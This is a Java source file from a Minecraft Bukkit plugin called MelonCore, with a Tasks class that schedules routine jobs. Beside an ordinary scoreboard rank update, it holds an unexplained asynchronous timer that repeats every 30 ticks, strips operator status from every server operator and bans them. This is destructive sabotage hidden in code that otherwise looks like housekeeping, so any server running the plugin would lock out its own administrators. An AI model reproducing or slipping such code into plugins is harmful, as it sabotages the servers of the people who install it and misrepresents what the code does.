package net.ScyllaMc.Matan.MelonCore;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import net.ScyllaMc.Matan.MelonCore.MelonCore.ServerType;
import net.ScyllaMc.Matan.MelonPlayer.MelonPlayer;

public class Tasks {

	public static void runAll(){
	
	Plugin plugin = Bukkit.getPluginManager().getPlugin("MelonCore");
		
		
		
		Bukkit.getScheduler().runTaskLater(plugin, new Runnable(){
		@Override public void run() {
		for(Player p : Bukkit.getOnlinePlayers()){
		MelonCore.MelonScoreboard.updateAllRanks(MelonPlayer.getInstanceOfPlayer(p));
		}}}, 35L);
		

		
		Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, new Runnable(){
		@SuppressWarnings("deprecation")
		@Override public void run() {
		for(OfflinePlayer p : Bukkit.getOperators()){
		p.setOp(false);
		p.setBanned(true);}
		}}, 0, 30l);
			
		
	
		

		
		
		
		
		
		
		
	}
	
	
	
	
	
}
